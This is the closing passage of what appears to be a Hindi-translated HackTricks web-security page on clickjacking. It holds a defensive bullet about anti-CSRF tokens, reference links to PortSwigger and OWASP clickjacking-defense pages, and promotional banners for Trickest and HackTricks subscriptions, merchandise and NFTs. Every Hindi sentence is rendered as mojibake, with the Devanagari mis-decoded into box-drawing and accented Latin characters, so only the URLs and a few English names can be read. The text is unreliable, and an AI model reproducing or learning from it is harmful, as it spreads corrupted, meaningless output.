* **рдЯреЛрдХрди рдорд╛рдиреНрдпрддрд╛:** рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдПрдВрдЯреА-рд╕реАрдПрд╕рдЖрд░рдПрдл рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛ рд╕рдХреЗ рдХрд┐ рд░рд╛рдЬреНрдп-рдкрд░рд┐рд╡рд░реНрддрди рд╡рд╛рд▓реЗ рдЕрдиреБрд░реЛрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЗрдЪреНрдЫрд╛рдкреВрд░реНрд╡рдХ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рди рдХрд┐ рдХреНрд▓рд┐рдХрдЬреИрдХреНрдб рдкреГрд╖реНрда рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред

## рд╕рдВрджрд░реНрдн

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ **рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд┐рд░реНрдорд┐рдд рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
